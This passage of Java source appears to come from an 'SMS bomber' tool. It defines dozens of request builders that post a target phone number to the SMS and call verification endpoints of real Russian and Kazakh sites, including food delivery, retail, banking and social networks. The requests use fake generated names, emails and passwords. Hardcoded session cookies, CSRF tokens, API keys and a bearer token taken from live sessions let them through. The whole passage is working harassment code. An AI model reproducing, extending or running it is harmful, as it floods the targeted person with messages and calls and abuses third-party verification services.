                    builder.add("phone", "+" + phone.toString());
                    builder.add("returnUrl", "/connect/authorize/callback?client_id=www&amp;scope=openid%20offline_access%20email%20phone%20profile%20roles%20reviews%20esia%20orders.r%20messagesender.sms%20Sravni.Reviews.Service%20Sravni.Osago.Service%20Sravni.QnA.Service%20Sravni.FileStorage.Service%20Sravni.PhoneVerifier.Service%20Sravni.Identity.Service%20Sravni.VZR.Service%20Sravni.Affiliates.Service%20Sravni.News.Service&amp;response_type=code%20id_token%20token&amp;redirect_uri=https%3A%2F%2Fwww.sravni.ru%2Fopenid%2Fcallback%2F&amp;response_mode=form_post&amp;state=aKMJO_u7seq0O8Z9swoMZNCxPQII1BQ3BXIcID0uDko&amp;nonce=GmzCt6zbp1YnZf9QHMmPR05NvwI3Cftm5or6YISMk0E&amp;login_hint&amp;acr_values");

                    request.header("Cookie", "_ym_uid=1648230902270232651; _ym_d=1652720791; .ASPXANONYMOUS=Wj7EH3nLFEqyHYYidQ77qw; _SL_=6.39.924.2529.; _ipl=6.39.924.2529.; __utmz=utmccn%3d(not%20set)%7cutmcct%3d(not%20set)%7cutmcmd%3d(none)%7cutmcsr%3d(direct)%7cutmctr%3d(not%20set); __utmx=utmccn%3d(not%20set)%7cutmcct%3d(not%20set)%7cutmcmd%3d(none)%7cutmcsr%3d(direct)%7cutmctr%3d(not%20set); AB_ACCIDENTINSURANCE=Test_000157_A; AB_ACCIDENTINSURANCE_DIRECT=never; AB_CREDITSELECTION=Test_000166_A; AB_CREDITSELECTION_DIRECT=never; _cfuvid=TKf4a7o.NTcTPY_jj3zbB16KROEpLGVqG0Imwqu3TEI-1656577933373-0-604800000; _ym_isad=2; __cf_bm=_M1xArnm.U77LAsOK_KlLRVFXulIg3HMgd..c9EiIY0-1656577934-0-AUVp6iX2Hs51aaQy+D9IHzsnLsF/EPMFijHTey8FTyQglJrrtTXU6dFRUj0vxr+RcG2AVwMko93NHqnHzk8Bz0g5PgqLJIdFv9rIikiW8R4PnhOLGnKUuDUbHL1/jAu1HnRMhV0JYn7iQgTltY9+qVjvFAYsGm7xArMGnX91PQXUkYOY18FgSDJ5n+/DoE5BpA==; _ga_WE262B3KPE=GS1.1.1656577934.1.0.1656577934.60; _ga=GA1.2.1897499837.1656577935; _gid=GA1.2.923198233.1656577935; _gat_UA-8755402-16=1; _dc_gtm_UA-8755402-14=1; _gcl_au=1.1.1765525680.1656577935; tmr_lvidTS=1648230904449; tmr_lvid=dbd59ad03175fd34d0f64f769fd0a5fd; uid=UbGokWK9X4+oKCNlCFuNAg==; .AspNetCore.Antiforgery.vnVzMy2Mv7Q=CfDJ8CweUVAmnVJNqszqP15xx-gMzc_APgAJ9lv4roObOleM7Ox8t2-vnQIlIJ-wYm7CCo8pj8IaZcFjEXe4o6mBvTybEccN7O-Aq8i7Z0iM9kfA0CCpVx-xprNiLnoRfIiWEMAq86LRrU2g-JUQ3RkFE_o; tmr_reqNum=11");
                }
            },

            new JsonService("https://api.totopizza.ru/graphql", 7) {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("operationName", "requestPhoneCodeRegister");
                        json.put("query", "\n" +
                                "  mutation requestPhoneCodeRegister($telephone:String! $name:String!) {\n" +
                                "    requestPhoneCodeRegister(input: { telephone:$telephone name:$name })\n" +
                                "  }\n");
                        json.put("variables", new JSONObject()
                                .put("name", getRussianName())
                                .put("telephone", format(phone.getPhone(), "+7 *** *** ** **")));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://authorization.wildberries.eu/api/v2/code/request") {
                @Override
                public String buildJson(Phone phone) {
                    try {
                        return new JSONObject()
                                .put("contact", phone.toString())
                                .put("auth_method", "sms")
                                .put("lang", "ru")
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new FormService("https://www.meloman.kz/customer/account/loginAjaxSendCodePost/", 7, 77) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("phone", format(phone.toString(), "+*(***)***-**-**"));
                    builder.add("canSendCode", "true");

                    request.header("Cookie", "region_id=541; region_just_set=1; PHPSESSID=95op9q5fqiqtpe9lpjvl2vppti; _dyjsession=d7bue1pmo1esc1pwh9ls4n4xaffvofos; dy_fs_page=www.meloman.kz; _dy_csc_ses=d7bue1pmo1esc1pwh9ls4n4xaffvofos; _dy_c_exps=; _dycnst=dg; _gcl_au=1.1.968364781.1659694169; gtmSID=9c0d3871-4f7e-4cbf-84e8-65461e247307; _dyid=-8547831098967847242; _dycst=dk.w.c.ws.; _dy_geo=RU.EU.RU_.RU__; _dy_df_geo=Russia..; _ym_uid=1659694170872825852; _ym_d=1659694170; _dyfs=1659694169656; _dy_toffset=-2; _dy_user_has_affinity=false; _dy_cs_cookie_items=_dy_user_has_affinity; _ga_D0HJ8R9QS2=GS1.1.1659694173.1.0.1659694173.60; _ga=GA1.2.201777281.1659694173; _gid=GA1.2.752243899.1659694173; _dc_gtm_UA-6878519-34=1; _dc_gtm_UA-6878519-27=1; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; _dy_soct=362831.602231.1659694168*381808.640682.1659694169*398001.680451.1659694169.d7bue1pmo1esc1pwh9ls4n4xaffvofos*477267.869366.1659694169*667137.1280681.1659694173*687006.1315500.1659694173; form_key=sD1D3NfZDKwMH035; mage-cache-sessid=true; _ym_visorc=w; _ym_isad=2; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; _tt_enable_cookie=1; _ttp=583af7f6-5be1-49b9-a34a-22708e1771de; _fbp=fb.1.1659694175101.931221081; form_key=sD1D3NfZDKwMH035; _dyid_server=-8547831098967847242; section_data_ids=%7B%22customer%22%3A1659694173%2C%22cart%22%3A1659694173%2C%22gtm%22%3A1659694173%7D; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D");
                    request.header("x-requested-with", "XMLHttpRequest");
                }
            },

            new FormService("https://www.marwin.kz/customer/account/loginAjaxSendCodePost/", 7, 77) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("phone", format(phone.toString(), "+*(***)***-**-**"));
                    builder.add("canSendCode", "true");

                    request.header("Cookie", "PHPSESSID=7pihhl37dfce9gdhbl0bkcudri; region_id=541; region_just_set=1; _dyjsession=5mapeo024pg8uzy7akpsyo2cch7upwmg; dy_fs_page=www.marwin.kz%2Ffood-items%2Fsweets; _dy_csc_ses=5mapeo024pg8uzy7akpsyo2cch7upwmg; _dy_c_exps=; _dycnst=dg; _gcl_au=1.1.152707412.1659694545; gtmSID=3cf7f71e-5c85-4d3a-b86a-5636070822dc; _ga_ZTZ7V5HTWZ=GS1.1.1659694545.1.0.1659694545.60; _dyid=-8547831098967847242; _dyfs=1659694545099; _dycst=dk.w.c.ws.; _dy_geo=RU.EU.RU_.RU__; _dy_df_geo=Russia..; _dy_toffset=-3; _dy_user_has_affinity=false; _dy_cs_cookie_items=_dy_user_has_affinity; _dy_soct=374152.624393.1659694544*398002.680454.1659694545.5mapeo024pg8uzy7akpsyo2cch7upwmg*412140.712261.1659694545.5mapeo024pg8uzy7akpsyo2cch7upwmg*424158.741600.1659694545.5mapeo024pg8uzy7akpsyo2cch7upwmg*477269.869368.1659694545; _gid=GA1.2.118795237.1659694546; _ga=GA1.2.960427966.1659694545; _gat_UA-6878519-34=1; _dc_gtm_UA-6878519-28=1; _ym_uid=16596945461037912764; _ym_d=1659694546; _userGUID=0:l6gba444:eBIz3ljwEcsH2pVSU~modh8PqEc3wgg5; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; _tt_enable_cookie=1; _ttp=fceedc0f-35e5-440f-819e-3add79b4b2d0; _ym_visorc=w; _ym_isad=2; form_key=JY5rra4s7wyHlJRV; _dyid_server=-8547831098967847242; mage-cache-sessid=true; _fbp=fb.1.1659694548127.1961207824; form_key=JY5rra4s7wyHlJRV; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; private_content_version=9d23496bf3ff7d8b37d61748f060f4eb; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; section_data_ids=%7B%22customer%22%3A1659694547%2C%22cart%22%3A1659694547%2C%22gtm%22%3A1659694548%7D");
                    request.header("x-requested-with", "XMLHttpRequest");
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback, Phone phone) {
                    client.newCall(new Request.Builder()
                            .url("https://food-port.ru/api/user/generate-password")
                            .header("x-thapl-apitoken", "0b84683a-14b6-11ed-9881-d00d1849d38c")
                            .header("x-thapl-domain", "kronshtadt.food-port.ru")
                            .header("x-thapl-region-id", "2")
                            .post(RequestBody.create("------WebKitFormBoundaryd1lHEip8CBDSaYZd\n" +
                                    "Content-Disposition: form-data; name=\"phone\"\n" +
                                    "\n" +
                                    format(phone.getPhone(), "+7 *** *** ** **") +
                                    "\n------WebKitFormBoundaryd1lHEip8CBDSaYZd--", MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryd1lHEip8CBDSaYZd")))
                            .build()).enqueue(callback);
                }
            },

            new FormService("https://dobropizza.ru/ajaxopen/userregisterdobro", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("username", format(phone.getPhone(), "+7(***) ***-**-**"));
                    builder.add("sms", "0");
                    builder.add("cis", "57");
                }
            },

            new FormService("https://italiani.rest/local/templates/italini/PhoneAuth.php", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("phone", format(phone.getPhone(), "+7(***)***-**-**"));
                    builder.add("type", "sendauth");
                }
            },

            new JsonService("https://api.eda1.ru/api/user/register", 7) {
                @Override
                public String buildJson(Phone phone) {
                    request.header("X-Api-Key", "6444100");
                    request.header("uuid", "796c26ae-8b7c-aac3-812a-34679393cd5e");

                    try {
                        return new JSONObject()
                                .put("phone", phone)
                                .put("verify_type", "call")
                                .put("password", "qwerty")
                                .put("password_repeat", "qwerty")
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new JsonService("https://api.sunlight.net/v3/customers/authorization/") {
                @Override
                public String buildJson(Phone phone) {
                    request.header("Cookie", "rr-testCookie=testvalue; rrpvid=355622261348501; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; city_auto_popup_shown=1; rcuid=6275fcd65368be000135cd22; city_id=117; city_name=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; city_full_name=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; region_id=91eae2f5-b1d7-442f-bc86-c6c11c581fad; region_name=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; region_subdomain=\"\"; ccart=off; _ga_HJNSJ6NG5J=GS1.1.1659884102.1.1.1659884103.59; _gcl_au=1.1.506379343.1659884104; session_id=6e72af95-3f3f-4b9f-a6d6-a7d278592347; _ga=GA1.2.1345812504.1659884102; _gid=GA1.2.362170990.1659884104; _gat_test=1; _gat_UA-11277336-11=1; _gat_UA-11277336-12=1; _gat_owox=1; tmr_lvid=220061aaaf4f8e8ab3c3985fb53cb3f3; tmr_lvidTS=1659884104985; tmr_reqNum=2; _tt_enable_cookie=1; _ttp=07d211e3-9558-4957-95dd-496cafdd2431; _ym_uid=1659884110990105023; _ym_d=1659884110; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; _ym_isad=2; _ym_visorc=b");

                    try {
                        return new JSONObject()
                                .put("phone", phone.toString())
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new ParamsService("https://bankiros.ru/send-code/verify") {
                @Override
                public void buildParams(Phone phone) {
                    request.header("Cookie", "_csrf=8582d9183ea0f6a17304125414be4795f198a69237317e3adf77463c93c2dc42a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%220bBJbi4bJgsHJ3_s2QkIYgUF5AGdKw8H%22%3B%7D; app_history=%5B%22https%3A%2F%2Fbankiros.ru%2F%22%5D; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2022-08-07%2017%3A47%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fbankiros.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2022-08-07%2017%3A47%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fbankiros.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F103.0.5060.134%20Safari%2F537.36%20Edg%2F103.0.1264.77; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbankiros.ru%2F; city-tooltip=1; prod=5posuk9of5hcopttjj6bnfe8g2; _gcl_au=1.1.1996142512.1659883651; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; ga_session_id=4ce074bd-0b40-4664-8231-10c73438fc06; _gid=GA1.2.151715844.1659883653; _ga_5D863YT644=GS1.1.1659883653.1.0.1659883653.0; tmr_lvid=7e50cf8f2108a9fb1e34da6702768225; tmr_lvidTS=1659883653264; tmr_detect=0%7C1659883655576; _ga=GA1.2.316605841.1659883653; _ym_uid=1659883656667247307; _ym_d=1659883656; _ym_visorc=b; _ym_isad=2; tmr_reqNum=3; cookies-tooltip=223025677b0f227a6dd1c3820a99553a6d485d2246bf8dbc1879a5982ec9a863a%3A2%3A%7Bi%3A0%3Bs%3A15%3A%22cookies-tooltip%22%3Bi%3A1%3Bs%3A1%3A%221%22%3B%7D");
                    request.header("x-csrf-token", "LcaB1fFLqRU-B791Zfir3HeB2tSxeA2vSWNTxHXxy9QdpMOfkyKdd3RgzD0vy_SvRdCxnegfWOl8IhSgPobznA==");
                    request.header("x-requested-with", "XMLHttpRequest");

                    builder.addQueryParameter("action", "sendSms");
                    builder.addQueryParameter("phone", phone.toString());
                    builder.addQueryParameter("userIdentityId", "91445499");
                    builder.addQueryParameter("ga", "GA1.2.316605841.1659883653");
                }
            },

            new JsonService("https://adengi.ru/rest/v1/registration/code/send") {
                @Override
                public String buildJson(Phone phone) {
                    request.header("Cookie", "deviceUid=14b4ccbc-9f0c-460e-b756-9edcf8cd68d2; __cfruid=5e7708e2f80d72738db410be7aee4e588e853f7c-1659885549; _ga=GA1.2.348103934.1659885585; _gid=GA1.2.2043862512.1659885585; tmr_lvid=e462f5f07dce35b045f464b2f70b516e; tmr_lvidTS=1656429758785; _ym_uid=1656429759333836542; _ym_d=1659885586; _ym_visorc=b; _ym_isad=2; tmr_detect=0%7C1659885587521; supportOnlineTalkID=GwJBk17SVDMh9IVIpEnrbvZdNdxdL86o; ec_id=14b4ccbc-9f0c-460e-b756-9edcf8cd68d2; deviceUid=14b4ccbc-9f0c-460e-b756-9edcf8cd68d2; tmr_reqNum=11");
                    request.header("x-device-uid", "14b4ccbc-9f0c-460e-b756-9edcf8cd68d2");
                    request.header("x-version-fe", "1659504023660");

                    try {
                        return new JSONObject()
                                .put("email", getEmail())
                                .put("firstName", getRussianName())
                                .put("lastName", getRussianName())
                                .put("middleName", getRussianName())
                                .put("phone", phone.toString())
                                .put("via", "sms")
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback, Phone phone) {
                    client.newCall(new Request.Builder()
                            .url("https://ovenpizza.ru/wp-content/themes/twentynineteen/inc/func.php")
                            .post(RequestBody.create("------WebKitFormBoundaryZqudgny7DXMMKMxU\n" +
                                    "Content-Disposition: form-data; name=\"flag\"\n" +
                                    "\n" +
                                    "check_login\n" +
                                    "------WebKitFormBoundaryZqudgny7DXMMKMxU\n" +
                                    "Content-Disposition: form-data; name=\"tel\"\n" +
                                    "\n" +
                                    format(phone.getPhone(), "+7 *** *** **-**") +
                                    "\n------WebKitFormBoundaryZqudgny7DXMMKMxU--", MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryZqudgny7DXMMKMxU")))
                            .build()).enqueue(callback);
                }
            },

            new FormService("https://lord-craft.ru/user_account/ajax.php?do=sms_code", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("phone", format(phone.getPhone(), "8(***)***-**-**"));
                }
            },

            new FormService("https://m.citystarwear.com/bitrix/templates/bs-base/php/includes/bs-handlers.php", 7) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("Cookie", "PHPSESSID=HJQDoayuamUP7xYhszkLAv8dYMUlcIET; I_BITRIX2_SM_SALE_UID=53c3cec1a62291f06e2377917aab0e5f; _ga=GA1.2.1401457724.1659889156; _gid=GA1.2.46912916.1659889156; _ym_uid=1659889156136024251; _ym_d=1659889156; _ym_visorc=w; _tt_enable_cookie=1; _ttp=690309d0-ce65-46e4-a1c4-72f66fe716b6; tmr_lvid=61bc4dd54d173b5997545a4a6777ca65; tmr_lvidTS=1659889157089; _ym_isad=2; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; I_BITRIX2_SM_BSPopUpBnr=%7B%2296591%22%3A1659975616%7D; I_BITRIX2_SM_BSCatalogSection=fast; tmr_detect=0%7C1659889259844; cto_bundle=M27XMF80Y0ladXRnZ0czRTh0WkJRTGp5UzVDVkVVRFdUajRqd1dhaiUyQjc4SmFRQ2d1SXRiNmZqM04lMkZlRmVzdnd1c2NHaGxUSjhPcU1MbUx5S3hpTTQwdGs3Tzh5WWJpUmFQTGZaTjlzS1E2dkNUYVFITmUyNzJralRyeVl2UDRrbmJmNUF2aWt2ZzlER0NMWFBqMTQlMkZuWVdreGclM0QlM0Q; tmr_reqNum=11; I_BITRIX2_SM_bsAuthPhone=7%239045950105; I_BITRIX2_SM_bsTimeCode=1659889456");

                    builder.add("hdlr", "bsAuthSendCode");
                    builder.add("key", "DOvBhIav34535434v212SEoVINS");
                    builder.add("phone", phone.getPhone());
                    builder.add("pcode", "+7");
                    builder.add("vphone", "");
                }
            },

            new ParamsService("https://stockmann.ru/ajax/", 7) {
                @Override
                public void buildParams(Phone phone) {
                    request.headers(new Headers.Builder().addUnsafeNonAscii("Cookie", "LM_FUSER=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ2YWx1ZSI6IjYyYmIxOWQ1NjM1OTgzLjY3NzYzNTIyNTZiM2M5OGY4NDUyNGQ1MDQyM2U0ODdlN2YzMzNjIn0.iEvAusQL6IYfNkKJIu30LTd9fJxv_lYFPFOKr569LGeokNZHwwVRJMMNpgR9zHFps_0jBB2U-2RkCUuypC4sbWJXBj0ecUoqJOTYi5MCCoaHcb8ICLTbkbZ3Lboaimy0UxmJCWx1qF_iQf1X7EWdRrJfKFrhQnRfiHWFoH_Yx1qbYY4T45BG7pzDiJ6rvinOzaBoBfUoE1Gb2Oufv8e0g7YTwjz_68CKkmbg6lycop_89Glh189inhqoG5x53lT8x0raFRQcphmF5nQl9bgxGsQ_PRFA1GhCyQxycV9P5-nolWSzpskb5cLVDm-ItpOjPuDgrL7hAIa-y894VJ4PjUUAOR5ZxiSJ7Oeao2mWXDhDNrn_Z-T5l4ZK02KBxBawPkkEH84tMEQGvBvJTMJuw7QbA0uBYLWePjOu8hBSkCzxhMrXsIhQu61BzIUHhJfceRtpcBBAoY71pHajGF7w05YWHXdTqXyEDmm6L3jKjYN3W1DVV10ZbGRlQTCtlDRoIhzmFYsY52BK-AyuTdj55dogFuS6pvv_kJ06yHvtVtvR7j0iI4Vy8pIhr67wNhlMEmQj7k6NHqktrSesDCqr7_nN0YG7g-CpZeQhvmY0E3RwrFLEomROwucb6AogDuDH5qzUoVkZHnGWp_z7PTK8lo8pP6yLywHumvdhGaziNEA; _ym_d=1656429014; _ym_uid=16445953601047771209; BITRIX_SM_CITY_NAME=Москва; BITRIX_SM_CITY_SALE_LOCATION_ID=129; BITRIX_SM_LOCATION_GUID=0c5b2444-70a0-4932-980c-b4dc0d3f02b5; BITRIX_SM_DOMAIN_ID=1; _gcl_au=1.1.1516261243.1659701048; tmr_lvid=4e684fc8bc0675f93bcfcf2e49ec8183; tmr_lvidTS=1644595359021; rrpvid=601653173509637; _ga=GA1.2.2110775532.1659701050; rcuid=6275fcd65368be000135cd22; iap.uid=a9a299db4d6c48c5837ca1b9c658c2d7; flocktory-uuid=d9f6b365-937b-4968-a247-ac7e86f44436-1; _tt_enable_cookie=1; _ttp=886adb30-d23b-4be8-b6f9-3bf28b1f2077; PHPSESSID=s54ieq49uplp5b4lqkq5jb950s; _ym_isad=2; _ym_visorc=b; _gid=GA1.2.2031731511.1659890230; tmr_detect=0|1659890230951; cto_bundle=r5kbc182enhuQmFaMkViaWFTNkw5VGlGJTJCMXpBeWs5Uk5EMnI0UkVuNVUzSEprY0Q2emdvYTB6SUdrWUR0NHJ0MEQ5RFNWd3ExN25xYnBwcVhUWE50MHIzTG9XRmFmUm9SWjJicmdnYWNRQ1RRM2s2Snl0UyUyRngwWWlMQzQ5NDdWU0luaDlvSWoydkhmUW1qYnVjUjEwNHphaUJBJTNEJTNE; tmr_reqNum=35").build());

                    builder.addQueryParameter("controller", "user");
                    builder.addQueryParameter("action", "registerUser");
                    builder.addQueryParameter("surname", getRussianName());
                    builder.addQueryParameter("name", getRussianName());
                    builder.addQueryParameter("phone", format(phone.getPhone(), "+7 (***) *** - ** - **"));
                    builder.addQueryParameter("email", getEmail());
                    builder.addQueryParameter("password", "qwertyuio");
                    builder.addQueryParameter("password_confirm", "qwertyuio");
                }
            },

            new FormService("https://chocofood.kz/gateway/user/v2/code/", 77) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("client_id", "11619734");
                    builder.add("login", phone.toString());
                }
            },

            new JsonService("https://sso.mycar.kz/auth/login/", 77) {
                @Override
                public String buildJson(Phone phone) {
                    try {
                        return new JSONObject()
                                .put("phone_number", "+" + phone.toString())
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new ParamsService("https://arbuz.kz/api/v1/user/verification/phone", 77) {
                @Override
                public void buildParams(Phone phone) {
                    request.header("authorization", "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI1MjZjODk1NS0wMzgzLTRiM2QtYTJjNy0wZDQ2N2NlYzVhZWQiLCJpc3MiOiJRaEZTNW5vMmJqQzQ3djVRNEU3N0FBMnh3V1BFdUJ1biIsImlhdCI6MTY1OTg5MTQ3MCwiZXhwIjo0ODEzNDkxNDcwLCJjb25zdW1lciI6eyJpZCI6ImU1YzRlYTA1LWY4ZTgtNDJiZC1iMDJhLWNmMzNlODAyZjA5NiIsIm5hbWUiOiJhcmJ1ei1rei53ZWIuZGVza3RvcCJ9LCJjaWQiOm51bGx9.ebpJLdB-FOfb1IsAVbW-dECSoKwQc5tsnhhYKZ_FeM4");

                    builder.addQueryParameter("phone", phone.toString());
                }
            },

            new JsonService("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code/sms", 7) {
                @Override
                public String buildJson(Phone phone) {
                    request.header("Accept", "application/json, text/javascript, */*; q=0.01");
                    request.header("Accept-Encoding", "gzip, deflate, br");
                    request.header("Accept-Language", "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7");
                    request.header("Connection", "keep-alive");
                    request.header("Content-Length", "24");
                    request.header("Content-Type", "application/json");
                    request.header("Cookie", "geo_site=www; geo_region_url=www; site_city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; site_city_id=2; mobile=false; device=pc; _ga=GA1.2.823290515.1656377291; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2022-06-28%2003%3A48%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fraiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2022-06-28%2003%3A48%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fraiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; _ym_uid=16563772911015405951; _ym_d=1656377291; __zzat129=MDA0dBA=Fz2+aQ==; geo_region=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; geo_region_coords=55.755787%2C37.617634; geo_site_region=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; cfids129=; APPLICATION_CONTEXT_CITY=21; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F102.0.5005.115%20Safari%2F537.36%20OPR%2F88.0.4412.75; _gid=GA1.2.229297435.1657385025; _ym_isad=1; _ym_visorc=b; geo_detect_coords=55.796539%2C49.1082; geo_detect_url=kazan; geo_detect=%D0%9A%D0%B0%D0%B7%D0%B0%D0%BD%D1%8C%2C%D0%A0%D0%B5%D1%81%D0%BF%D1%83%D0%B1%D0%BB%D0%B8%D0%BA%D0%B0%20%D0%A2%D0%B0%D1%82%D0%B0%D1%80%D1%81%D1%82%D0%B0%D0%BD%2C%D0%9F%D1%80%D0%B8%D0%B2%D0%BE%D0%BB%D0%B6%D1%81%D0%BA%D0%B8%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; _gat=1; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2Fretail%2Fcards%2Fdebit%2Fcashback-card%2F%23ccform-form");
                    request.header("DNT", "1");
                    request.header("Host", "oapi.raiffeisen.ru");
                    request.header("Origin", "https://www.raiffeisen.ru");
                    request.header("Referer", "https://www.raiffeisen.ru/retail/cards/debit/cashback-card/");
                    request.header("Sec-Fetch-Dest", "empty");
                    request.header("Sec-Fetch-Mode", "cors");
                    request.header("sec-ch-ua", "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"");
                    request.header("sec-ch-ua-mobile", "?0");
                    request.header("sec-ch-ua-platform", "\"Windows\"");
                    request.header("Sec-Fetch-Site", "same-site");

                    try {
                        return new JSONObject()
                                .put("number", phone.toString())
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new FormService("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone") {
                @Override
                public void buildBody(Phone phone) {
                    request.header("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                    request.header("accept-encoding", "gzip, deflate, br");
